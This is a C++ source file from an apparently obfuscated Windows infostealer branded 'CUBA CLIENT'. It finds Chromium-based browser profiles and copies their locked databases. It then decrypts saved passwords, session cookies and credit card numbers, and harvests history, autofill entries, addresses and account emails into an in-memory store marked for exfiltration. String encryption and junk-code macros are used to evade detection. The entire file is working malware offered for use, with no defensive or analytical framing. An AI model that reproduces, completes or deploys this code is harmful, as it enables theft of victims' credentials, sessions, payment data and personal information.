#include <chromium/extract_chromium.hpp>
#include <browser_utils/get_browsers.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <vector>
#include <set>
#include <fstream>
#include <filesystem>
#include <browser_utils/chromium/chromium_structs.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <browser_utils/stats_struct.hpp>
#include <crypto_utils/crypto_helper.h>
#include <chromium/decrypt_db.hpp>
#include <sqlite_utils/sqlite3_wrapper.h>
#include <obfuscation/opaque.hpp>
#include <json/json.hpp>
#include <windows.h>

namespace fs = std::filesystem;
using json = nlohmann::json;

//copy db + wal/shm to temp so we can open it while the browser holds the lock
static fs::path copy_db_to_temp(const fs::path& src) {
    if (!fs::exists(src)) return {};
    fs::path dst = fs::temp_directory_path() / src.filename();
    if (!CopyFileA(src.string().c_str(), dst.string().c_str(), FALSE))
        return {};
    for (const char* ext : { (const char*)skCrypt("-wal"), (const char*)skCrypt("-shm") }) {
        fs::path wf(src.string() + ext);
        if (fs::exists(wf))
            CopyFileA(wf.string().c_str(), (dst.string() + ext).c_str(), FALSE);
    }
    return dst;
}

static void remove_temp_db(const fs::path& tmp) {
    fs::remove(tmp);
    fs::remove(fs::path(tmp.string() + "-wal"));
    fs::remove(fs::path(tmp.string() + "-shm"));
}

//derive a friendly browser label and per-profile virtual path prefix
//profile C:\...\Google\Chrome\User Data\Default
static std::string chromium_vprefix(const fs::path& profile) {
    fs::path user_data = profile.parent_path();
    fs::path browser   = user_data.parent_path();
    std::string bname  = browser.filename().string();
    std::string parent = browser.parent_path().filename().string();
    std::string pname  = profile.filename().string();

    std::string label;
    if      (bname == skCrypt("Chrome")     && parent == skCrypt("Google"))  label = skCrypt("Google Chrome");
    else if (bname == skCrypt("Chrome SxS") && parent == skCrypt("Google"))  label = skCrypt("Chrome Canary");
    else if (bname.find(skCrypt("Edge"))  != std::string::npos)              label = skCrypt("Microsoft Edge");
    else if (bname.find(skCrypt("Brave")) != std::string::npos)              label = skCrypt("Brave");
    else if (bname == skCrypt("Arc"))                                         label = skCrypt("Arc");
    else if (parent == skCrypt("Opera Software"))                             label = bname;
    else if (parent == skCrypt("Yandex"))                                     label = skCrypt("Yandex Browser");
    else if (bname == skCrypt("Chromium"))                                    label = skCrypt("Chromium");
    else label = bname.empty() ? skCrypt("Unknown") : bname;

    return skCrypt("chromium/") + label + "/" + pname + "/";
}

//convert chrome microseconds-since-1601 to human-readable UTC string
static std::string chrome_time_str(int64_t t) {
    if (t <= 0) return "";
    ULARGE_INTEGER li;
    li.QuadPart = (ULONGLONG)t * 10; //microseconds to 100-ns intervals
    FILETIME ft{ li.LowPart, li.HighPart };
    SYSTEMTIME st{};
    FileTimeToSystemTime(&ft, &st);
    char buf[32];
    snprintf(buf, sizeof(buf), skCrypt("%04d-%02d-%02d %02d:%02d:%02d UTC"),
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return buf;
}

namespace features {

    features::stealer_stats stats = { 0, 0, 0, 0 };

    std::vector<std::string> get_chromium_profiles() {
        auto found = utils::get_chromium_browsers();
        std::vector<std::string> all;

        for (const auto& browser_path : found) {
            try {
                for (const auto& entry : fs::directory_iterator(browser_path)) {
                    if (entry.is_directory() && fs::exists(entry.path() / skCrypt("Login Data")))
                        all.push_back(entry.path().string());
                }
            } catch (...) {}
        }
        return all;
    }

    void extract_chromium_cookies(std::vector<std::string>& profiles) {
        OPAQUE_JUNK();
        for (const auto& profile : profiles) {
            fs::path p(profile);
            auto aes_key = db_helper::get_master_key(p.parent_path());
            if (aes_key.empty()) continue;

            fs::path db = p / skCrypt("Network") / skCrypt("Cookies");
            if (!fs::exists(db)) db = p / skCrypt("Cookies");
            if (!fs::exists(db)) continue;

            auto tmp = copy_db_to_temp(db);
            if (tmp.empty()) continue;

            std::string vprefix = chromium_vprefix(p);
            namespace sqlite = sqlite3_wrapper;
            try {
                sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);
                auto stmt = conn.prepare(skCrypt("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies"));
                stmt.execute();

                std::string out;
                ChromiumCookie c;
                while (stmt.fetch(c.host_key, c.name, c.value, c.encrypted_value, c.path, c.expires_utc, c.secure, c.http_only)) {
                    std::string val;
                    if (c.encrypted_value.size() >= 3 && c.encrypted_value[0] == 'v' &&
                        isdigit((unsigned char)c.encrypted_value[1])) {
                        try {
                            auto dec = crypto_helper::aes_gcm_decrypt(
                                std::vector<BYTE>(c.encrypted_value.begin(), c.encrypted_value.end()), aes_key);
                            bool v20 = c.encrypted_value.size() >= 3 &&
                                       c.encrypted_value[1] == '2' && c.encrypted_value[2] == '0';
                            size_t off = (v20 && dec.size() > 32) ? 32 : 0;
                            val = std::string(dec.begin() + off, dec.end());
                        } catch (...) { val = c.value; }
                    } else if (!c.value.empty()) {
                        val = c.value;
                    } else if (!c.encrypted_value.empty()) {
                        try {
                            auto dec = crypto_helper::dpapi_unprotect(
                                std::vector<BYTE>(c.encrypted_value.begin(), c.encrypted_value.end()));
                            val = std::string(dec.begin(), dec.end());
                        } catch (...) {}
                    }
                    features::stats.cookie_count++;
                    out += skCrypt("Host: ")     + c.host_key + "\n"
                         + skCrypt("Name: ")     + c.name     + "\n"
                         + skCrypt("Value: ")    + val        + "\n"
                         + skCrypt("Path: ")     + c.path     + "\n"
                         + skCrypt("Expires: ")  + chrome_time_str(c.expires_utc) + "\n"
                         + skCrypt("Secure: ")   + (c.secure    ? "true" : "false") + "\n"
                         + skCrypt("HttpOnly: ") + (c.http_only  ? "true" : "false") + "\n"
                         + skCrypt("\n-# CUBA CLIENT #-\n");
                }
                if (!out.empty())
                    mem_store::append(vprefix + skCrypt("cookies.txt"), out);
            } catch (...) {}
            remove_temp_db(tmp);
        }
    }

    void extract_chromium_passwords(std::vector<std::string>& profiles) {
        OPAQUE_JUNK();
        for (const auto& profile : profiles) {
            fs::path p(profile);
            auto aes_key = db_helper::get_master_key(p.parent_path());
            if (aes_key.empty()) continue;

            auto tmp = copy_db_to_temp(p / skCrypt("Login Data"));
            if (tmp.empty()) continue;

            std::string vprefix = chromium_vprefix(p);
            namespace sqlite = sqlite3_wrapper;
            try {
                sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);
                auto stmt = conn.prepare(skCrypt("SELECT origin_url, username_value, password_value FROM logins"));
                stmt.execute();

                std::string out;
                ChromiumPassword pw;
                while (stmt.fetch(pw.origin_url, pw.username_value, pw.encrypted_password_value)) {
                    std::string plain;
                    const auto& blob = pw.encrypted_password_value;

                    if (blob.empty()) {
                        plain = "";
                    } else if (blob.size() >= 3 && blob[0] == 'v' && isdigit((unsigned char)blob[1])) {
                        try {
                            auto dec = crypto_helper::aes_gcm_decrypt(
                                std::vector<BYTE>(blob.begin(), blob.end()), aes_key);
                            plain = std::string(dec.begin(), dec.end());
                        } catch (const std::exception& e) { plain = std::string(skCrypt("(")) + e.what() + ")"; }
                    } else {
                        try {
                            auto dec = crypto_helper::dpapi_unprotect(
                                std::vector<BYTE>(blob.begin(), blob.end()));
                            plain = std::string(dec.begin(), dec.end());
                        } catch (const std::exception& e) { plain = std::string(skCrypt("(dpapi: ")) + e.what() + ")"; }
                        if (plain.empty()) plain = skCrypt("(unknown format)");
                    }
                    features::stats.password_count++;
                    out += skCrypt("URL: ")      + pw.origin_url      + "\n"
                         + skCrypt("Username: ") + pw.username_value  + "\n"
                         + skCrypt("Password: ") + plain              + "\n"
                         + skCrypt("\n-# CUBA CLIENT #-\n");
                }
                if (!out.empty())
                    mem_store::append(vprefix + skCrypt("passwords.txt"), out);
            } catch (...) {}
            remove_temp_db(tmp);
        }
    }

    void extract_chromium_history(std::vector<std::string>& profiles) {
        for (const auto& profile : profiles) {
            fs::path p(profile);
            fs::path db = p / skCrypt("History");
            auto tmp = copy_db_to_temp(db);
            if (tmp.empty()) continue;

            std::string vprefix = chromium_vprefix(p);
            namespace sqlite = sqlite3_wrapper;
            try {
                sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);
                auto stmt = conn.prepare(skCrypt("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC"));
                stmt.execute();

                std::string out;
                ChromiumHistoryEntry e;
                while (stmt.fetch(e.url, e.title, e.visit_count, e.last_visit_time)) {
                    out += skCrypt("URL: ")      + e.url   + "\n"
                         + skCrypt("Title: ")    + e.title  + "\n"
                         + skCrypt("Visits: ")   + std::to_string(e.visit_count) + "\n"
                         + skCrypt("LastVisit: ") + chrome_time_str(e.last_visit_time) + "\n"
                         + skCrypt("\n-# CUBA CLIENT #-\n");
                }
                if (!out.empty())
                    mem_store::append(vprefix + skCrypt("history.txt"), out);
            } catch (...) {}
            remove_temp_db(tmp);
        }
    }

    void extract_chromium_cards(std::vector<std::string>& profiles) {
        for (const auto& profile : profiles) {
            fs::path p(profile);
            auto aes_key = db_helper::get_master_key(p.parent_path());
            if (aes_key.empty()) continue;

            auto tmp = copy_db_to_temp(p / skCrypt("Web Data"));
            if (tmp.empty()) continue;

            std::string vprefix = chromium_vprefix(p);
            namespace sqlite = sqlite3_wrapper;
            try {
                sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);
                auto stmt = conn.prepare(skCrypt("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"));
                stmt.execute();

                std::string out;
                ChromiumCard c;
                while (stmt.fetch(c.name_on_card, c.expiration_month, c.expiration_year, c.card_number_encrypted)) {
                    std::string num;
                    if (c.card_number_encrypted.size() > 3 && c.card_number_encrypted[0] == 'v' && c.card_number_encrypted[1] == '1') {
                        try {
                            auto dec = crypto_helper::aes_gcm_decrypt(
                                std::vector<BYTE>(c.card_number_encrypted.begin(), c.card_number_encrypted.end()), aes_key);
                            num = std::string(dec.begin(), dec.end());
                        } catch (...) { num = skCrypt("(decrypt failed)"); }
                    } else {
                        num = c.card_number_encrypted;
                    }
                    features::stats.card_count++;
                    out += skCrypt("Name: ")   + c.name_on_card + "\n"
                         + skCrypt("Number: ") + num            + "\n"
                         + skCrypt("Expiry: ") + std::to_string(c.expiration_month) + "/" + std::to_string(c.expiration_year) + "\n"
                         + skCrypt("\n-# CUBA CLIENT #-\n");
                }
                if (!out.empty())
                    mem_store::append(vprefix + skCrypt("credit_cards.txt"), out);
            } catch (...) {}
            remove_temp_db(tmp);
        }
    }

    void extract_chromium_autofill(std::vector<std::string>& profiles) {
        for (const auto& profile : profiles) {
            fs::path p(profile);
            auto tmp = copy_db_to_temp(p / skCrypt("Web Data"));
            if (tmp.empty()) continue;

            std::string vprefix = chromium_vprefix(p);
            namespace sqlite = sqlite3_wrapper;
            try {
                sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);

                //form field history
                {
                    auto stmt = conn.prepare(skCrypt("SELECT name, value, count FROM autofill ORDER BY count DESC"));
                    stmt.execute();
                    std::string out;
                    ChromiumAutofill e;
                    while (stmt.fetch(e.name, e.value, e.count)) {
                        out += skCrypt("Field: ") + e.name  + "\n"
                             + skCrypt("Value: ") + e.value + "\n"
                             + skCrypt("Uses: ")  + std::to_string(e.count) + "\n"
                             + skCrypt("\n-# CUBA CLIENT #-\n");
                    }
                    if (!out.empty())
                        mem_store::append(vprefix + skCrypt("autofill.txt"), out);
                }

                //autofill addresses (name, street addy, city, postal code etc.)
                try {
                    auto stmt = conn.prepare(skCrypt(
                        "SELECT first_name, middle_name, last_name, email, company_name, "
                        "address_line1, address_line2, city, state, zipcode, country_code, phone_number "
                        "FROM autofill_profiles"));
                    stmt.execute();
                    std::string out;
                    while (true) {
                        std::string fn, mn, ln, em, co, al1, al2, ci, st, zp, cc, ph;
                        if (!stmt.fetch(fn, mn, ln, em, co, al1, al2, ci, st, zp, cc, ph)) break;
                        out += skCrypt("Name: ")    + fn + " " + mn + " " + ln + "\n"
                             + skCrypt("Email: ")   + em + "\n"
                             + skCrypt("Company: ") + co + "\n"
                             + skCrypt("Address: ") + al1 + " " + al2 + "\n"
                             + skCrypt("City: ")    + ci + "\n"
                             + skCrypt("State: ")   + st + "\n"
                             + skCrypt("ZIP: ")     + zp + "\n"
                             + skCrypt("Country: ") + cc + "\n"
                             + skCrypt("Phone: ")   + ph + "\n"
                             + skCrypt("\n-# CUBA CLIENT #-\n");
                    }
                    if (!out.empty())
                        mem_store::append(vprefix + skCrypt("addresses.txt"), out);
                } catch (...) {}

            } catch (...) {}
            remove_temp_db(tmp);
        }
    }

    void extract_chromium_accounts(std::vector<std::string>& profiles) {
        //collect unique browser roots (all profiles share one Local State)
        std::set<std::string> roots;
        for (const auto& p : profiles)
            roots.insert(fs::path(p).parent_path().string());

        for (const auto& root : roots) {
            fs::path ls = fs::path(root) / skCrypt("Local State");
            if (!fs::exists(ls)) continue;
            try {
                std::ifstream f(ls);
                json j;
                f >> j;

                std::string browser_label;
                {
                    fs::path b = fs::path(root);
                    std::string bname  = b.filename().string();
                    std::string parent = b.parent_path().filename().string();
                    if      (bname == skCrypt("Chrome") && parent == skCrypt("Google")) browser_label = skCrypt("Google Chrome");
                    else if (bname.find(skCrypt("Edge"))  != std::string::npos)        browser_label = skCrypt("Microsoft Edge");
                    else if (bname.find(skCrypt("Brave")) != std::string::npos)        browser_label = skCrypt("Brave");
                    else browser_label = bname;
                }

                std::string out;
                std::string vbase = skCrypt("chromium/") + browser_label + "/";

                {
                    std::string k_ai = skCrypt("account_info");
                    if (j.contains(k_ai)) {
                        for (auto& acc : j[k_ai]) {
                            out += skCrypt("Email: ")  + acc.value(skCrypt("email"), "")     + "\n"
                                 + skCrypt("GaiaID: ") + acc.value(skCrypt("gaia"), "")      + "\n"
                                 + skCrypt("Name: ")   + acc.value(skCrypt("full_name"), "") + "\n"
                                 + skCrypt("\n-# CUBA CLIENT #-\n");
                        }
                    }
                }
                {
                    std::string k_prof = skCrypt("profile");
                    std::string k_ic   = skCrypt("info_cache");
                    if (j.contains(k_prof) && j[k_prof].contains(k_ic)) {
                        for (auto& [pn, pi] : j[k_prof][k_ic].items()) {
                            std::string email = pi.value(skCrypt("user_name"), "");
                            std::string gaia  = pi.value(skCrypt("gaia_id"), "");
                            if (!email.empty())
                                out += skCrypt("Profile: ") + pn + "\n"
                                     + skCrypt("Email: ")   + email + "\n"
                                     + skCrypt("GaiaID: ")  + gaia  + "\n"
                                     + skCrypt("\n-# CUBA CLIENT #-\n");
                        }
                    }
                }

                if (!out.empty())
                    mem_store::append(vbase + skCrypt("accounts.txt"), out);
            } catch (...) {}
        }
    }

    //single pass per profile: master key once, each DB opened once, Web Data used for both cards and autofill
    void extract_chromium_all(std::vector<std::string>& profiles) {
        OPAQUE_JUNK();
        for (const auto& pstr : profiles) {
            fs::path p(pstr);
            auto key     = db_helper::get_master_key(p.parent_path());
            if (key.empty()) continue;
            auto vprefix = chromium_vprefix(p);
            namespace sqlite = sqlite3_wrapper;

            //passwords
            {
                auto tmp = copy_db_to_temp(p / skCrypt("Login Data"));
                if (!tmp.empty()) {
                    try {
                        sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);
                        auto stmt = conn.prepare(skCrypt("SELECT origin_url, username_value, password_value FROM logins"));
                        stmt.execute();
                        std::string out;
                        ChromiumPassword pw;
                        while (stmt.fetch(pw.origin_url, pw.username_value, pw.encrypted_password_value)) {
                            std::string plain;
                            const auto& blob = pw.encrypted_password_value;
                            if (blob.empty()) {
                            } else if (blob.size() >= 3 && blob[0] == 'v' && isdigit((unsigned char)blob[1])) {
                                try {
                                    auto dec = crypto_helper::aes_gcm_decrypt(
                                        std::vector<BYTE>(blob.begin(), blob.end()), key);
                                    plain = std::string(dec.begin(), dec.end());
                                } catch (const std::exception& e) { plain = std::string(skCrypt("(")) + e.what() + ")"; }
                            } else {
                                try {
                                    auto dec = crypto_helper::dpapi_unprotect(
                                        std::vector<BYTE>(blob.begin(), blob.end()));
                                    plain = std::string(dec.begin(), dec.end());
                                } catch (...) {}
                                if (plain.empty()) plain = skCrypt("(unknown format)");
                            }
                            features::stats.password_count++;
                            out += skCrypt("URL: ")      + pw.origin_url     + "\n"
                                 + skCrypt("Username: ") + pw.username_value + "\n"
                                 + skCrypt("Password: ") + plain             + "\n"
                                 + skCrypt("\n-# CUBA CLIENT #-\n");
                        }
                        if (!out.empty()) mem_store::append(vprefix + skCrypt("passwords.txt"), out);
                    } catch (...) {}
                    remove_temp_db(tmp);
                }
            }

            //cookies
            {
                fs::path db = p / skCrypt("Network") / skCrypt("Cookies");
                if (!fs::exists(db)) db = p / skCrypt("Cookies");
                auto tmp = copy_db_to_temp(db);
                if (!tmp.empty()) {
                    try {
                        sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);
                        auto stmt = conn.prepare(skCrypt("SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies"));
                        stmt.execute();
                        std::string out;
                        ChromiumCookie c;
                        while (stmt.fetch(c.host_key, c.name, c.value, c.encrypted_value, c.path, c.expires_utc, c.secure, c.http_only)) {
                            std::string val;
                            if (c.encrypted_value.size() >= 3 && c.encrypted_value[0] == 'v' &&
                                isdigit((unsigned char)c.encrypted_value[1])) {
                                try {
                                    auto dec = crypto_helper::aes_gcm_decrypt(
                                        std::vector<BYTE>(c.encrypted_value.begin(), c.encrypted_value.end()), key);
                                    bool v20 = c.encrypted_value[1] == '2' && c.encrypted_value[2] == '0';
                                    size_t off = (v20 && dec.size() > 32) ? 32 : 0;
                                    val = std::string(dec.begin() + off, dec.end());
                                } catch (...) { val = c.value; }
                            } else if (!c.value.empty()) {
                                val = c.value;
                            } else if (!c.encrypted_value.empty()) {
                                try {
                                    auto dec = crypto_helper::dpapi_unprotect(
                                        std::vector<BYTE>(c.encrypted_value.begin(), c.encrypted_value.end()));
                                    val = std::string(dec.begin(), dec.end());
                                } catch (...) {}
                            }
                            features::stats.cookie_count++;
                            out += skCrypt("Host: ")     + c.host_key + "\n"
                                 + skCrypt("Name: ")     + c.name     + "\n"
                                 + skCrypt("Value: ")    + val        + "\n"
                                 + skCrypt("Path: ")     + c.path     + "\n"
                                 + skCrypt("Expires: ")  + chrome_time_str(c.expires_utc) + "\n"
                                 + skCrypt("Secure: ")   + (c.secure    ? "true" : "false") + "\n"
                                 + skCrypt("HttpOnly: ") + (c.http_only ? "true" : "false") + "\n"
                                 + skCrypt("\n-# CUBA CLIENT #-\n");
                        }
                        if (!out.empty()) mem_store::append(vprefix + skCrypt("cookies.txt"), out);
                    } catch (...) {}
                    remove_temp_db(tmp);
                }
            }

            //history
            {
                auto tmp = copy_db_to_temp(p / skCrypt("History"));
                if (!tmp.empty()) {
                    try {
                        sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);
                        auto stmt = conn.prepare(skCrypt("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC"));
                        stmt.execute();
                        std::string out;
                        ChromiumHistoryEntry e;
                        while (stmt.fetch(e.url, e.title, e.visit_count, e.last_visit_time)) {
                            out += skCrypt("URL: ")       + e.url   + "\n"
                                 + skCrypt("Title: ")     + e.title  + "\n"
                                 + skCrypt("Visits: ")    + std::to_string(e.visit_count) + "\n"
                                 + skCrypt("LastVisit: ") + chrome_time_str(e.last_visit_time) + "\n"
                                 + skCrypt("\n-# CUBA CLIENT #-\n");
                        }
                        if (!out.empty()) mem_store::append(vprefix + skCrypt("history.txt"), out);
                    } catch (...) {}
                    remove_temp_db(tmp);
                }
            }

            //web data: cards and autofill in one open
            {
                auto tmp = copy_db_to_temp(p / skCrypt("Web Data"));
                if (!tmp.empty()) {
                    try {
                        sqlite::db conn(tmp.string(), SQLITE_OPEN_READONLY);

                        //cards
                        {
                            auto stmt = conn.prepare(skCrypt("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"));
                            stmt.execute();
                            std::string out;
                            ChromiumCard c;
                            while (stmt.fetch(c.name_on_card, c.expiration_month, c.expiration_year, c.card_number_encrypted)) {
                                std::string num;
                                if (c.card_number_encrypted.size() > 3 && c.card_number_encrypted[0] == 'v' && c.card_number_encrypted[1] == '1') {
                                    try {
                                        auto dec = crypto_helper::aes_gcm_decrypt(
                                            std::vector<BYTE>(c.card_number_encrypted.begin(), c.card_number_encrypted.end()), key);
                                        num = std::string(dec.begin(), dec.end());
                                    } catch (...) { num = skCrypt("(decrypt failed)"); }
                                } else {
                                    num = c.card_number_encrypted;
                                }
                                features::stats.card_count++;
                                out += skCrypt("Name: ")   + c.name_on_card + "\n"
                                     + skCrypt("Number: ") + num            + "\n"
                                     + skCrypt("Expiry: ") + std::to_string(c.expiration_month) + "/" + std::to_string(c.expiration_year) + "\n"
                                     + skCrypt("\n-# CUBA CLIENT #-\n");
                            }
                            if (!out.empty()) mem_store::append(vprefix + skCrypt("credit_cards.txt"), out);
                        }

                        //autofill fields
                        {
                            auto stmt = conn.prepare(skCrypt("SELECT name, value, count FROM autofill ORDER BY count DESC"));
                            stmt.execute();
                            std::string out;
                            ChromiumAutofill e;
                            while (stmt.fetch(e.name, e.value, e.count)) {
                                out += skCrypt("Field: ") + e.name  + "\n"
                                     + skCrypt("Value: ") + e.value + "\n"
                                     + skCrypt("Uses: ")  + std::to_string(e.count) + "\n"
                                     + skCrypt("\n-# CUBA CLIENT #-\n");
                            }
                            if (!out.empty()) mem_store::append(vprefix + skCrypt("autofill.txt"), out);
                        }

                        //autofill addresses
                        try {
                            auto stmt = conn.prepare(skCrypt(
                                "SELECT first_name, middle_name, last_name, email, company_name, "
                                "address_line1, address_line2, city, state, zipcode, country_code, phone_number "
                                "FROM autofill_profiles"));
                            stmt.execute();
                            std::string out;
                            while (true) {
                                std::string fn, mn, ln, em, co, al1, al2, ci, st, zp, cc, ph;
                                if (!stmt.fetch(fn, mn, ln, em, co, al1, al2, ci, st, zp, cc, ph)) break;
                                out += skCrypt("Name: ")    + fn + " " + mn + " " + ln + "\n"
                                     + skCrypt("Email: ")   + em + "\n"
                                     + skCrypt("Company: ") + co + "\n"
                                     + skCrypt("Address: ") + al1 + " " + al2 + "\n"
                                     + skCrypt("City: ")    + ci + "\n"
                                     + skCrypt("State: ")   + st + "\n"
                                     + skCrypt("ZIP: ")     + zp + "\n"
                                     + skCrypt("Country: ") + cc + "\n"
                                     + skCrypt("Phone: ")   + ph + "\n"
                                     + skCrypt("\n-# CUBA CLIENT #-\n");
                            }
                            if (!out.empty()) mem_store::append(vprefix + skCrypt("addresses.txt"), out);
                        } catch (...) {}

                    } catch (...) {}
                    remove_temp_db(tmp);
                }
            }
        }

        extract_chromium_accounts(profiles);
    }
}
